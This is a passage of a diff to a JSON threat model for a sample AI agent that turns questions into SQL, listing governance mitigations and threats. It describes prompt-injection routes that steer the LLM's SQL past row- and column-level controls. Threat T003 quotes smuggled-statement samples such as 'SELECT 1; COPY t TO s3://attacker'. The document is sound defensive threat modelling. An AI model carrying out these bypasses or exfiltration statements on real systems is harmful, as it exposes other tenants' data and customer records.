-      "residual_severity": "Low",
-      "residual_likelihood": "Unlikely",
-      "rationale": "Probe failure keeps the full denylist (fail-closed); cache is per-session/per-principal by construction. Residual only if the customer redeploys the module multi-principal - covered by T015.",
-      "is_current": true
-    },
-    {
-      "threat_id": "T013",
-      "decision": "Mitigated",
-      "residual_severity": "Low",
-      "residual_likelihood": "Unlikely",
-      "rationale": "Three independent layers: statement gate allowlist, READ_ONLY attaches, IAM role without write permissions. COPY TO and ATTACH explicitly rejected with tests.",
-      "is_current": true
-    },
-    {
-      "threat_id": "T014",
-      "decision": "Mitigated",
-      "residual_severity": "Low",
-      "residual_likelihood": "Unlikely",
-      "rationale": "_conn_lock serializes execute+fetch atomically incl. the schema probe; the async-generator tool preserves lock semantics via asyncio.to_thread; regression test exists. Single-principal-per-session makes the worst case an integrity glitch, not cross-principal leakage.",
-      "is_current": true
-    },
-    {
-      "threat_id": "T015",
-      "decision": "Accepted",
-      "residual_severity": "High",
-      "residual_likelihood": "Possible",
-      "rationale": "Misuse-of-sample risk: the module-level active-role slot is only safe under one-session-one-principal (AgentCore microVM). Cannot be closed by code in a sample - the misuse happens in the consumer's fork. Controlled by prominent documentation (module docstring + README + this model). Accepted with the HIGH residual kept visible on purpose.",
-      "is_current": true
-    },
-    {
-      "threat_id": "T016",
-      "decision": "Accepted",
-      "residual_severity": "Low",
-      "residual_likelihood": "Likely",
-      "rationale": "Deliberate transparency tradeoff: the trace shows the principal only their OWN policy application - the same information the clean rejection message conveys - never another tenant's policy or data. Deployments preferring opacity have a single filter point (_map_event). Demo legibility is the sample's purpose.",
-      "is_current": true
-    }
-  ],
-  "softwareProfile": {
-    "software_type": "AI / ML System",
-    "deployment_model": "Serverless / FaaS",
-    "architecture_style": "Serverless",
-    "platform_runtime": "Cloud runtime",
-    "user_domain": "Financial",
-    "licensing_ownership": "Open source",
-    "modern_paradigms": [
-      "Agentic AI",
-      "Cloud-native"
-    ],
-    "description": "Python 3.11-3.13 on Amazon Bedrock AgentCore Runtime (one microVM per session). Core modules: (1) agent.py - Strands Agent + Bedrock Claude with one gated async-generator run_sql tool over an in-memory DuckDB (httpfs/iceberg/ducklake extensions). The read-only gate enforces EXACTLY ONE statement per call (duckdb.extract_statements, the engine's own parser) and strips leading SQL comments before keyword classification; identity resolution chain: verified JWT claims (custom:tenant/custom:role normalized) -> runtime user-id header -> payload identity -> default role. The streaming entrypoint (async generator -> SSE) emits typed envelopes incl. a per-statement gate/govern/execute trace. (2) governance.py - authorization: principal->role->policy mapping where an unknown role inside a known tenant falls back to that tenant's MOST RESTRICTED policy (content-derived restrictiveness ranking, declaration-order independent); sqlglot AST rewrite injecting RLS predicates via guarded subqueries and schema-aware CLS EXCLUDE; explicit selection of a denied column is rejected with a legible policy error naming column and role; raw table functions are governed by an ALLOWLIST on AST shape (only exp.Identifier FROM/JOIN sources allowed; pure generators excepted) rather than a function-name denylist; fail-closed on unparseable SQL. (3) ui/app.py - Streamlit chat client: Cognito USER_PASSWORD_AUTH login (client secret via env), sends the ID token as bearer to the runtime over raw HTTPS, renders the interleaved reasoning+tool transcript and a Trace tab. (4) infra/ CDK - S3 buckets (SSE, BlockPublicAccess, enforce_ssl), Cognito user pool + app client, least-privilege execution role, CloudWatch logs. CI: GitLab pipeline with ruff/bandit/semgrep/detect-secrets/pytest gates (96 offline unit tests incl. mutation-verified fail-closed authz tests)."
-  },
-  "dataAssetProfiles": [
-    {
-      "id": "DP001",
-      "name": "Analytical dataset on S3",
-      "asset_id": null,
-      "structural_category": "Structured Data",
-      "content_types": [
-        "Non-sensitive / other"
-      ],
-      "sensitivity_tier": "Public",
-      "compliance_regimes": [],
-      "data_states": [
-        "At rest",
-        "In transit"
-      ],
-      "volume_tier": "Big data",
-      "lifecycle_state": "Active",
-      "business_domain": null,
-      "description": "Parquet/Iceberg tables on S3: public aws-public-blockchain Ethereum data (eth_traces incident-window slice in S3 Tables/Glue/DuckLake legs, full history via raw views). Customer-substituted data may be confidential. Per-tenant visibility is enforced by the RLS/CLS rewrite - the asset the governance layer protects."
-    },
-    {
-      "id": "DP002",
-      "name": "Identity claims (tenant, role)",
-      "asset_id": null,
-      "structural_category": "API Data",
-      "content_types": [
-        "Authentication credentials"
-      ],
-      "sensitivity_tier": "Internal",
-      "compliance_regimes": [],
-      "data_states": [
-        "In transit",
-        "In use"
-      ],
-      "volume_tier": null,
-      "lifecycle_state": null,
-      "business_domain": null,
-      "description": "Cognito ID-token claims (custom:tenant/custom:role) validated by the AgentCore managed inbound JWT authorizer (allowedAudience) BEFORE agent code runs, then normalized by _resolve_claims; or identity asserted by a SigV4-authenticated calling application (runtime user-id header / payload identity - local/CLI path). Integrity of these claims is the security foundation of the authorization layer."
-    },
-    {
-      "id": "DP003",
-      "name": "Governance policy table",
-      "asset_id": null,
-      "structural_category": "Configuration Data",
-      "content_types": [
-        "System metadata"
-      ],
-      "sensitivity_tier": "Internal",
-      "compliance_regimes": [],
-      "data_states": [
-        "At rest",
-        "In use"
-      ],
-      "volume_tier": null,
-      "lifecycle_state": null,
-      "business_domain": null,
-      "description": "GOVERNANCE_POLICIES JSON env configuration: per-table row_filter / deny_columns + allow_raw_paths switch, keyed by tenant:role. Defines who sees what; owned by the operator. Unknown roles in a known tenant resolve to the tenant's most restricted policy (content-derived ranking)."
-    },
-    {
-      "id": "DP004",
-      "name": "Attribution label tables",
-      "asset_id": null,
-      "structural_category": "Structured Data",
-      "content_types": [
-        "PII",
-        "Non-sensitive / other"
-      ],
-      "sensitivity_tier": "Internal",
-      "compliance_regimes": [],
-      "data_states": [
-        "At rest",
-        "In transit"
-      ],
-      "volume_tier": "Small",
-      "lifecycle_state": null,
-      "business_domain": null,
-      "description": "ofac_addresses (REAL public OFAC SDN list, ~120 rows) and cex_deposit_labels (SYNTHETIC exchange deposit labels whose subject_identity column mimics customer KYC linkage to demonstrate CLS). subject_identity is column-denied to the junior role; in a real deployment this table carries actual KYC linkage and its protection is the point of the CLS demo."
-    },
-    {
-      "id": "DP005",
-      "name": "Cognito app client secret",
-      "asset_id": null,
-      "structural_category": "Secrets and Credentials",
-      "content_types": [
-        "Authentication credentials"
-      ],
-      "sensitivity_tier": "Restricted",
-      "compliance_regimes": [],
-      "data_states": [
-        "At rest",
-        "In use"
-      ],
-      "volume_tier": null,
-      "lifecycle_state": null,
-      "business_domain": null,
-      "description": "App client secret used by the Streamlit UI for SECRET_HASH computation during USER_PASSWORD_AUTH login. Supplied via environment variable to the UI process; never committed to the repo."
-    },
-    {
-      "id": "DP006",
-      "name": "DuckLake PostgreSQL credentials",
-      "asset_id": null,
-      "structural_category": "Secrets and Credentials",
-      "content_types": [
-        "Authentication credentials"
-      ],
-      "sensitivity_tier": "Restricted",
-      "compliance_regimes": [],
-      "data_states": [
-        "At rest",
-        "In use"
-      ],
-      "volume_tier": null,
-      "lifecycle_state": null,
-      "business_domain": null,
-      "description": "Optional multi-writer catalog credentials stored in AWS Secrets Manager, fetched at runtime by the execution role; never in env vars or code."
-    }
-  ],
-  "userPersonas": [
-    {
-      "id": "UP001",
-      "persona_type": "Authenticated Standard User",
-      "name": "End user (investigator / junior analyst)",
-      "privilege_level": "Low",
-      "organizational_affiliation": "Customer",
-      "functional_roles": [
-        "End User"
-      ],
-      "intent_behavior": "Legitimate",
-      "entity_type": "Human",
-      "authentication_method": "Token",
-      "threat_actor_overlay": [],
-      "description": "Logs in at Cognito; ID-token claims carry tenant/role; may be a restricted principal whose data visibility is limited by RLS/CLS policy. Primary adversary in this model: tries to observe other tenants' rows or denied columns through crafted natural-language questions (prompt injection into generated SQL).",
-      "is_relevant": true
-    },
-    {
-      "id": "UP002",
-      "persona_type": "Non-Human Identity / Service Account",
-      "name": "Calling application (SigV4)",
-      "privilege_level": "Elevated",
-      "organizational_affiliation": "Customer",
-      "functional_roles": [
-        "Integration Endpoint"
-      ],
-      "intent_behavior": "Legitimate",
-      "entity_type": "Non-Human",
-      "authentication_method": "IAM Role",
-      "threat_actor_overlay": [],
-      "description": "IAM-authenticated infrastructure invoking the runtime on the local/CLI path; trusted to assert its end-users' identity via the runtime user-id header or payload identity object. Its compromise means arbitrary identity assertion - documented trust assumption; unused when the JWT authorizer is configured (the deployed default).",
-      "is_relevant": true
-    },
-    {
-      "id": "UP003",
-      "persona_type": "Developer / DevOps User",
-      "name": "Operator (deployer)",
-      "privilege_level": "Administrative",
-      "organizational_affiliation": "Customer",
-      "functional_roles": [
-        "Administrator",
-        "Developer"
-      ],
-      "intent_behavior": "Legitimate",
-      "entity_type": "Human",
-      "authentication_method": "IAM Role",
-      "threat_actor_overlay": [],
-      "description": "Customer engineer deploying the sample; owns all env configuration including GOVERNANCE_POLICIES, Cognito pool/users, and catalog ARNs. Out of scope as an adversary (owns the account and the data).",
-      "is_relevant": true
-    },
-    {
-      "id": "UP004",
-      "persona_type": "Non-Human Identity / Service Account",
-      "name": "LLM (Bedrock Claude)",
-      "privilege_level": "Low",
-      "organizational_affiliation": null,
-      "functional_roles": [
-        "Service Account"
-      ],
-      "intent_behavior": "Compromised",
-      "entity_type": "Non-Human",
-      "authentication_method": "None",
-      "threat_actor_overlay": [],
-      "description": "Generates SQL from natural language. Untrusted-input channel: its output executes against the engine after the single-statement read-only gate and governance rewrite. Subject to prompt injection via user questions; treated as an attacker-controlled SQL source in this model.",
-      "is_relevant": true
-    }
-  ],
-  "nonFunctionalRequirements": [
-    {
-      "quality_class": "Fail-Safe Behaviour",
-      "level": "Revert to safe state",
-      "rationale": "The governance layer must fail closed: a restricted principal must never observe rows or columns outside their policy via any of the four access paths. Unparseable SQL, schema-probe failure, unknown principal (falls to the tenant's MOST restricted policy or the default role), and explicit denied-column selection must result in rejection or the most restrictive policy - never fail-open. Verified by mutation testing (Phase 7.5 fixes)."
-    },
-    {
-      "quality_class": "User Error Protection",
-      "level": "Strong",
-      "rationale": "Agent-generated SQL (which may be wrong or adversarial via prompt injection) must not write persistently, exfiltrate to external targets (COPY TO), attach foreign databases, smuggle a second statement behind a read (single-statement rule enforced with the engine's own parser), or reach raw file-reading table functions as a restricted principal (AST-shape allowlist, not a name denylist)."
-    }
-  ],
-  "phaseProgress": {
-    "current_phase": 9,
-    "current_phase_name": "Output Generation and Documentation",
-    "phase_completion": {
-      "1": 1.0,
-      "2": 1.0,
-      "3": 1.0,
-      "4": 1.0,
-      "5": 1.0,
-      "6": 1.0,
-      "7": 1.0,
-      "7.5": 1.0,
-      "8": 1.0,
-      "9": 1.0
-    },
-    "phases": {
-      "1": "Business Context Analysis",
-      "2": "Architecture Analysis",
-      "3": "Threat Actor Analysis",
-      "4": "Trust Boundary Analysis",
-      "5": "Asset Flow Analysis",
-      "6": "Threat Identification",
-      "7": "Mitigation Planning",
-      "7.5": "Code Validation Analysis",
-      "8": "Residual Risk Analysis",
-      "9": "Output Generation and Documentation"
-    },
-    "overall_completion": 1.0
-  },
-  "referenceCatalogue": {
-    "description": "Threat actors the server pre-loaded but that were never assessed for this system. These are NOT part of the threat model.",
-    "threatActors": []
+  {
+   "id": "A010",
+   "numericId": 10,
+   "content": "The SigV4 payload/header identity-assertion path exists for local/CLI development only; the deployed reference configuration uses the Cognito JWT authorizer.",
+   "displayOrder": 10,
+   "metadata": []
   }
+ ],
+ "mitigations": [
+  {
+   "id": "M001",
+   "numericId": 1,
+   "status": "mitigationResolved",
+   "content": "Governance rewrite operates on the parsed AST, not string matching: every reference to a governed logical table - via raw view, s3t.*, glue.* or dl.* alias - is replaced by a guarded subquery (RLS predicate + schema-aware CLS EXCLUDE); alias semantics preserved in joins. Local names may NOT shadow a governed table (M018) - the earlier 'skip CTE/CTAS-local names' exemption was itself the bypass - so every table node carrying a governed name is guarded. Governable statement shapes are allowlisted (M017). Explicit selection of a denied column is rejected pre-engine with a legible policy error naming the column and role (never an opaque binder error).",
+   "displayOrder": 1,
+   "metadata": []
+  },
+  {
+   "id": "M002",
+   "numericId": 2,
+   "status": "mitigationResolved",
+   "content": "Fail-closed on parse failure: SQL that sqlglot cannot parse is REJECTED for restricted principals (ValueError), never passed through. Unrestricted principals (allow_raw_paths + no governed tables) bypass rewrite by explicit policy only.",
+   "displayOrder": 2,
+   "metadata": []
+  },
+  {
+   "id": "M003",
+   "numericId": 3,
+   "status": "mitigationResolved",
+   "content": "Single-statement rule: the gate requires EXACTLY ONE statement per run_sql call, split with duckdb.extract_statements - the engine's own parser, so there is no lexer divergence to aim at; semicolons inside literals/comments/dollar-quotes handled for free. Closes the multi-statement smuggling fail-open (a write riding behind a read).",
+   "displayOrder": 3,
+   "metadata": []
+  },
+  {
+   "id": "M004",
+   "numericId": 4,
+   "status": "mitigationResolved",
+   "content": "Read-only statement gate: leading-comment stripping then keyword allowlist (read statements + CREATE TEMP TABLE/VIEW); rejects INSERT/UPDATE/DELETE/non-temp CREATE/ATTACH/COPY TO. DuckDB catalog legs attach READ_ONLY; engine is in-memory and dies with the session; execution role has no write permissions on data buckets - three independent layers against persistence/exfiltration.",
+   "displayOrder": 4,
+   "metadata": []
+  },
+  {
+   "id": "M005",
+   "numericId": 5,
+   "status": "mitigationResolved",
+   "content": "Raw file access governed by an ALLOWLIST on AST shape, not a function-name denylist: every FROM/JOIN source must be an exp.Identifier (a real table/view/CTE/temp reference); table-valued functions are rejected with the offending name, with a minimal justified exception list for pure generators (GenerateSeries). Closes the parquet_scan/read_csv_auto/read_json bypass and is future-proof against new DuckDB file functions.",
+   "displayOrder": 5,
+   "metadata": []
+  },
+  {
+   "id": "M006",
+   "numericId": 6,
+   "status": "mitigationResolved",
+   "content": "Unknown-role fallback fails CLOSED: an unknown role inside a known tenant resolves to that tenant's MOST restricted policy, ranked by policy content (raw-path denial > governed-table count > row filters > denied columns) over sorted keys - never by declaration order. Unknown tenants get the configured default role.",
+   "displayOrder": 6,
+   "metadata": []
+  },
+  {
+   "id": "M007",
+   "numericId": 7,
+   "status": "mitigationResolved",
+   "content": "Inbound AuthN enforced by the platform before agent code: Amazon Cognito user pool issues ID tokens (custom:tenant/custom:role); the AgentCore managed customJWTAuthorizer validates signature (discovery URL) and allowedAudience; requestHeaderAllowlist forwards only Authorization. Verified live: no-token=401, forged-token=403, both pre-code. The sample's jwt.decode(verify_signature=False) is claims EXTRACTION from an already-verified token.",
+   "displayOrder": 7,
+   "metadata": []
+  },
+  {
+   "id": "M008",
+   "numericId": 8,
+   "status": "mitigationResolved",
+   "content": "Session blast-radius isolation: one session = one microVM = one DuckDB; a pathological query OOMs only its own session. Resource envelope (DUCKDB_MEMORY_LIMIT + spill directory) turns memory exhaustion into slower-not-dead. Bedrock/S3 cost exposure bounded by the customer's own account throttles.",
+   "displayOrder": 8,
+   "metadata": []
+  },
+  {
+   "id": "M009",
+   "numericId": 9,
+   "status": "mitigationResolved",
+   "content": "run_sql serialization under _conn_lock: execute+fetch pairs are atomic on the shared connection; the governance schema probe takes the same lock. Regression test covers parallel tool calls not stealing each other's results.",
+   "displayOrder": 9,
+   "metadata": []
+  },
+  {
+   "id": "M010",
+   "numericId": 10,
+   "status": "mitigationResolved",
+   "content": "Schema-aware CLS fails closed: EXCLUDE lists are intersected with a DESCRIBE-probed schema per reference; if the probe FAILS the full denylist is kept (worst case the engine rejects the query). The probe cache lives in one session = one principal = one microVM, so cross-principal poisoning is structurally impossible in the intended deployment.",
+   "displayOrder": 10,
+   "metadata": []
+  },
+  {
+   "id": "M011",
+   "numericId": 11,
+   "status": "mitigationResolved",
+   "content": "Observability of governance decisions: every run_sql result carries a governed flag and engine metrics; the SSE trace labels each decision (which row filter, which hidden column, or the policy rejection); runtime logs to CloudWatch. Gives operators an audit signal for whether and how the rewrite applied.",
+   "displayOrder": 11,
+   "metadata": []
+  },
+  {
+   "id": "M012",
+   "numericId": 12,
+   "status": "mitigationResolved",
+   "content": "DOCUMENTATION: deployment warnings that (a) without the inbound JWT authorizer, JWT claims are NOT verified and SigV4 identity-assertion paths trust the caller completely - production deployments must treat calling-application identity assertion as a privileged operation; (b) the module-level active-role slot is valid ONLY under one-session-one-principal (AgentCore microVM) and must not be lifted into multi-principal services; (c) demo Cognito users ship with a documented password - rotate credentials and restrict the user pool before exposing a deployment.",
+   "displayOrder": 12,
+   "metadata": []
+  },
+  {
+   "id": "M013",
+   "numericId": 13,
+   "status": "mitigationResolved",
+   "content": "Policy-as-configuration with a fail-safe default: GOVERNANCE_POLICIES is JSON env config and the default is the built-in deny-all floor, not an unrestricted role (see M019). Startup validation of the policy table is IMPLEMENTED, not merely recommended - see M021. Unknown roles inside a known tenant still resolve to that tenant's most restricted policy (M006), with deny_all ranking above every other policy in the restrictiveness ordering.",
+   "displayOrder": 13,
+   "metadata": []
+  },
+  {
+   "id": "M014",
+   "numericId": 14,
+   "status": "mitigationResolvedWillNotAction",
+   "content": "Residual acceptance for inference/side channels: aggregate-inference and timing side channels against denied columns are NOT fully closed by any query-rewrite RLS/CLS implementation (industry-wide limitation, same class as BI-tool row-level security). Sample carries a not-for-production disclaimer; production guidance is physical separation (per-tenant tables/views) when denied data is high-sensitivity.",
+   "displayOrder": 14,
+   "metadata": []
+  },
+  {
+   "id": "M015",
+   "numericId": 15,
+   "status": "mitigationResolved",
+   "content": "Trace transparency is deliberate and bounded: the SSE trace exposes the principal's OWN policy application (their row filter, their denied columns) - the exact information the clean rejection message already conveys - and never another tenant's policy or data. For deployments preferring opacity, the entrypoint envelope mapping is a single filter point to drop rls[]/cls[] details from the stream.",
+   "displayOrder": 15,
+   "metadata": []
+  },
+  {
+   "id": "M016",
+   "numericId": 16,
+   "status": "mitigationResolved",
+   "content": "UI credential hygiene: the app client secret enters the UI only via environment variable (never the repo; detect-secrets gate in CI); tokens live in Streamlit session state in-process; persona switching is logout/login so identity is always a validated JWT claim, not a UI toggle.",
+   "displayOrder": 16,
+   "metadata": []
+  },
+  {
+   "id": "M017",
+   "numericId": 17,
+   "status": "mitigationResolved",
+   "content": "Statement shapes are an ALLOWLIST on the parsed root (Select, SetOperation, Subquery, Create, Describe, Summarize, Show). sqlglot renders anything it cannot model - EXPLAIN, EXPLAIN ANALYZE, SHOW <table>, future syntax - as an opaque Command node with NO table references, which the rewrite loop silently passed through; EXPLAIN ANALYZE then executed the ungoverned inner query and reported denied-row cardinalities in the plan. Everything outside the allowlist is now rejected for restricted principals. DESCRIBE/SUMMARIZE of a governed table emit the guard as DESCRIBE SELECT * FROM (guard); a PIVOT modifier is moved onto the guard so it aggregates governed rows.",
+   "displayOrder": 17,
+   "metadata": []
+  },
+  {
+   "id": "M018",
+   "numericId": 18,
+   "status": "mitigationResolved",
+   "content": "Local names may not shadow governed tables: a CTE, CTAS/temp table, temp view, derived-table alias or table alias that reuses a governed table's name is REJECTED, replacing the previous 'skip table nodes bearing a local name' exemption which unguarded the real base table (RLS and CLS both bypassed, cross-tenant PII proven readable). Refusing the collision - rather than scoping the exemption across recursive CTEs, nested scopes and DuckDB's temp-schema search order - makes the invariant total: with no collision possible, a governed name always denotes the governed table and every reference is guarded.",
+   "displayOrder": 18,
+   "metadata": []
+  },
+  {
+   "id": "M019",
+   "numericId": 19,
+   "status": "mitigationResolved",
+   "content": "Deny-all floor as the default role: the built-in 'deny-all' policy is always present in the policy table, is the default when GOVERNANCE_DEFAULT_ROLE is unset, and is where blank / missing / unknown-tenant claims resolve. It rejects every statement before parsing, and the AgentCore entrypoint refuses the invocation up front (one 'access denied' envelope, model never invoked, no Bedrock spend). Local CLI runs must name the principal explicitly (--as <tenant>:<role>), so 'no identity' can never mean 'the admin identity'.",
+   "displayOrder": 19,
+   "metadata": []
+  },
+  {
+   "id": "M020",
+   "numericId": 20,
+   "status": "mitigationResolved",
+   "content": "Identity source cannot self-assign governance claims: the Cognito app client declares explicit attribute permissions with custom:tenant / custom:role in READ attributes only (the ID token must still carry them) and never in WRITE attributes, so UpdateUserAttributes with a user's own token is refused (NotAuthorizedException). Role assignment is an operator action via AdminUpdateUserAttributes. Enforced in infra/stack.py via ClientAttributes and applied to the deployed client. MFA on the pool is deliberately left OFF for demo convenience - production guidance keeps it (T008).",
+   "displayOrder": 20,
+   "metadata": []
+  },
+  {
+   "id": "M021",
+   "numericId": 21,
+   "status": "mitigationResolved",
+   "content": "Policy JSON validated at load (supersedes M013's 'recommended hardening'): keys must be <tenant>:<role>, fields must be known, table and denied-column names must be bare identifiers, each row_filter must parse as exactly ONE WHERE predicate, allow_raw_paths may not be combined with governed tables (a raw path read bypasses table rules), and the deny-all floor cannot be redefined as permissive. Malformed configuration fail-stops at import instead of silently governing nothing.",
+   "displayOrder": 21,
+   "metadata": []
+  },
+  {
+   "id": "M022",
+   "numericId": 22,
+   "status": "mitigationResolved",
+   "content": "LABELS_PREFIX validated before it reaches SQL: strict s3://<bucket>/<key> syntax over [A-Za-z0-9._-] only (no quotes, whitespace, parentheses or other schemes - nothing that can leave the read_parquet literal), no '.'/'..' segments, and the bucket must be the solution-owned bucket or one named in LABELS_ALLOWED_BUCKETS. Since these tables decide the OUTCOME of a sanctions screen, a bad value fail-stops the process rather than screening against attacker-chosen data.",
+   "displayOrder": 22,
+   "metadata": []
+  }
+ ],
+ "assumptionLinks": [],
+ "mitigationLinks": [
+  {
+   "linkedId": "T001",
+   "mitigationId": "M001"
+  },
+  {
+   "linkedId": "T001",
+   "mitigationId": "M002"
+  },
+  {
+   "linkedId": "T001",
+   "mitigationId": "M005"
+  },
+  {
+   "linkedId": "T001",
+   "mitigationId": "M011"
+  },
+  {
+   "linkedId": "T002",
+   "mitigationId": "M002"
+  },
+  {
+   "linkedId": "T002",
+   "mitigationId": "M001"
+  },
+  {
+   "linkedId": "T003",
+   "mitigationId": "M003"
+  },
+  {
+   "linkedId": "T003",
+   "mitigationId": "M004"
+  },
+  {
+   "linkedId": "T004",
+   "mitigationId": "M005"
+  },
+  {
+   "linkedId": "T004",
+   "mitigationId": "M004"
+  },
+  {
+   "linkedId": "T005",
+   "mitigationId": "M006"
+  },
+  {
+   "linkedId": "T005",
+   "mitigationId": "M013"
+  },
+  {
+   "linkedId": "T006",
+   "mitigationId": "M007"
+  },
+  {
+   "linkedId": "T007",
+   "mitigationId": "M007"
+  },
+  {
+   "linkedId": "T007",
+   "mitigationId": "M012"
+  },
+  {
+   "linkedId": "T008",
+   "mitigationId": "M016"
+  },
+  {
+   "linkedId": "T008",
+   "mitigationId": "M012"
+  },
+  {
+   "linkedId": "T009",
+   "mitigationId": "M014"
+  },
+  {
+   "linkedId": "T009",
+   "mitigationId": "M001"
+  },
+  {
+   "linkedId": "T010",
+   "mitigationId": "M008"
+  },
+  {
+   "linkedId": "T011",
+   "mitigationId": "M013"
+  },
+  {
+   "linkedId": "T011",
+   "mitigationId": "M011"
+  },
+  {
+   "linkedId": "T012",
+   "mitigationId": "M010"
+  },
+  {
+   "linkedId": "T013",
+   "mitigationId": "M004"
+  },
+  {
+   "linkedId": "T013",
+   "mitigationId": "M003"
+  },
+  {
+   "linkedId": "T014",
+   "mitigationId": "M009"
+  },
+  {
+   "linkedId": "T015",
+   "mitigationId": "M012"
+  },
+  {
+   "linkedId": "T016",
+   "mitigationId": "M015"
+  },
+  {
+   "linkedId": "T016",
+   "mitigationId": "M011"
+  },
+  {
+   "linkedId": "T017",
+   "mitigationId": "M017"
+  },
+  {
+   "linkedId": "T017",
+   "mitigationId": "M002"
+  },
+  {
+   "linkedId": "T018",
+   "mitigationId": "M020"
+  },
+  {
+   "linkedId": "T018",
+   "mitigationId": "M007"
+  },
+  {
+   "linkedId": "T001",
+   "mitigationId": "M017"
+  },
+  {
+   "linkedId": "T001",
+   "mitigationId": "M018"
+  },
+  {
+   "linkedId": "T002",
+   "mitigationId": "M017"
+  },
+  {
+   "linkedId": "T008",
+   "mitigationId": "M020"
+  },
+  {
+   "linkedId": "T009",
+   "mitigationId": "M017"
+  },
+  {
+   "linkedId": "T011",
+   "mitigationId": "M019"
+  },
+  {
+   "linkedId": "T011",
+   "mitigationId": "M021"
+  },
+  {
+   "linkedId": "T011",
+   "mitigationId": "M022"
+  }
+ ],
+ "threats": [
+  {
+   "id": "T001",
+   "numericId": 1,
+   "threatSource": "Restricted end user (authenticated, low privilege)",
+   "prerequisites": "Valid Cognito login with restricted tenant:role claims; ability to ask arbitrary natural-language questions",
+   "threatAction": "Crafts questions that steer the LLM into SQL designed to bypass the RLS/CLS rewrite: catalog-qualified alternate paths (s3t/glue/dl) to the same table, CTE/alias tricks, or requesting denied columns",
+   "threatImpact": "Cross-tenant row visibility or denied-column disclosure - defeat of the authorization layer",
+   "impactedGoal": [],
+   "impactedAssets": [
+    "A001"
+   ],
+   "statement": "A Restricted end user (authenticated, low privilege) Valid Cognito login with restricted tenant:role claims; ability to ask arbitrary natural-language questions can Crafts questions that steer the LLM into SQL designed to bypass the RLS/CLS rewrite: catalog-qualified alternate paths (s3t/glue/dl) to the same table, CTE/alias tricks, or requesting denied columns, which leads to Cross-tenant row visibility or denied-column disclosure - defeat of the authorization layer",
+   "displayOrder": 1,
+   "status": "threatResolved",
+   "tags": [
+    "prompt-injection",
+    "authz-bypass",
+    "core-threat"
+   ],
+   "metadata": []
+  },
+  {
+   "id": "T002",
+   "numericId": 2,
+   "threatSource": "Restricted end user via LLM prompt injection",
+   "prerequisites": "Same as above; knowledge that an embedded engine executes generated SQL",
+   "threatAction": "Steers the LLM into SQL that is unparseable by sqlglot but valid DuckDB (dialect divergence), hoping the rewrite layer passes it through unmodified",
+   "threatImpact": "Ungoverned statement reaches the engine - RLS/CLS bypass",
+   "impactedGoal": [],
+   "impactedAssets": [
+    "A001"
+   ],
+   "statement": "A Restricted end user via LLM prompt injection Same as above; knowledge that an embedded engine executes generated SQL can Steers the LLM into SQL that is unparseable by sqlglot but valid DuckDB (dialect divergence), hoping the rewrite layer passes it through unmodified, which leads to Ungoverned statement reaches the engine - RLS/CLS bypass",
+   "displayOrder": 2,
+   "status": "threatResolved",
+   "tags": [
+    "parser-divergence",
+    "fail-closed"
+   ],
+   "metadata": []
+  },
+  {
+   "id": "T003",
+   "numericId": 3,
+   "threatSource": "Restricted end user via LLM prompt injection",
+   "prerequisites": "Valid restricted session; gate classifies on the leading keyword",
+   "threatAction": "Smuggles a write or exfiltration statement behind a read in one submission: 'SELECT 1; DROP TABLE x' or 'SELECT 1; COPY t TO s3://attacker' - the historical fail-open closed by the single-statement",
+   "threatImpact": "Persistent write, data exfiltration via COPY TO, or session-state destruction despite the read-only gate",
+   "impactedGoal": [],
+   "impactedAssets": [
+    "A001",
+    "A005"
+   ],
+   "statement": "A Restricted end user via LLM prompt injection Valid restricted session; gate classifies on the leading keyword can Smuggles a write or exfiltration statement behind a read in one submission: 'SELECT 1; DROP TABLE x' or 'SELECT 1; COPY t TO s3://attacker' - the historical fail-open closed by the single-statement, which leads to Persistent write, data exfiltration via COPY TO, or session-state destruction despite the read-only gate",
+   "displayOrder": 3,
+   "status": "threatResolved",
+   "tags": [
+    "multi-statement",
+    "write-gate",
+    "phase-7.5-fix"
+   ],
+   "metadata": []
+  },
+  {
+   "id": "T004",
+   "numericId": 4,
+   "threatSource": "Restricted end user via LLM prompt injection",
+   "prerequisites": "Valid restricted session; DuckDB exposes dozens of file-reading table functions and adds more each release",
+   "threatAction": "Uses a file-reading table function NOT on a name denylist - parquet_scan (alias of read_parquet), read_csv_auto, read_json_auto, read_text, glob - to read S3 paths directly, bypassing every",
+   "threatImpact": "Full raw-path read of any data the execution role can reach - complete RLS/CLS bypass",
+   "impactedGoal": [],
+   "impactedAssets": [
+    "A001"
+   ],
+   "statement": "A Restricted end user via LLM prompt injection Valid restricted session; DuckDB exposes dozens of file-reading table functions and adds more each release can Uses a file-reading table function NOT on a name denylist - parquet_scan (alias of read_parquet), read_csv_auto, read_json_auto, read_text, glob - to read S3 paths directly, bypassing every, which leads to Full raw-path read of any data the execution role can reach - complete RLS/CLS bypass",
+   "displayOrder": 4,
+   "status": "threatResolved",
+   "tags": [
+    "raw-path",
+    "allowlist",
+    "phase-7.5-fix"
+   ],
+   "metadata": []
+  },
+  {
+   "id": "T005",
+   "numericId": 5,
+   "threatSource": "Restricted end user presenting an unknown role",
+   "prerequisites": "Valid Cognito login for a known tenant but a role string with no exact policy match; tenant declares multiple policies",
+   "threatAction": "Relies on the unknown-role fallback: if it returned the FIRST declared policy of the tenant (dict order), an admin-first declaration hands the unknown role full access (the historical",
+   "threatImpact": "Unrestricted policy for an unknown principal: no RLS, no CLS, raw paths allowed",
+   "impactedGoal": [],
+   "impactedAssets": [
+    "A001",
+    "A004"
+   ],
+   "statement": "A Restricted end user presenting an unknown role Valid Cognito login for a known tenant but a role string with no exact policy match; tenant declares multiple policies can Relies on the unknown-role fallback: if it returned the FIRST declared policy of the tenant (dict order), an admin-first declaration hands the unknown role full access (the historical, which leads to Unrestricted policy for an unknown principal: no RLS, no CLS, raw paths allowed",
+   "displayOrder": 5,
+   "status": "threatResolved",
+   "tags": [
+    "role-fallback",
+    "order-dependence",
+    "phase-7.5-fix"
+   ],
+   "metadata": []
+  },
+  {
+   "id": "T006",
+   "numericId": 6,
+   "threatSource": "External attacker at the runtime endpoint",
+   "prerequisites": "Network reach to the public AgentCore runtime endpoint; no valid Cognito token",
+   "threatAction": "Invokes the runtime with no token, a forged token, an expired token, or a token minted for a different audience/client",
+   "threatImpact": "Unauthenticated agent invocation: data access under the default role and Bedrock/S3 cost burn",
+   "impactedGoal": [],
+   "impactedAssets": [
+    "A002"
+   ],
+   "statement": "A External attacker at the runtime endpoint Network reach to the public AgentCore runtime endpoint; no valid Cognito token can Invokes the runtime with no token, a forged token, an expired token, or a token minted for a different audience/client, which leads to Unauthenticated agent invocation: data access under the default role and Bedrock/S3 cost burn",
+   "displayOrder": 6,
+   "status": "threatResolved",
+   "tags": [
+    "authn",
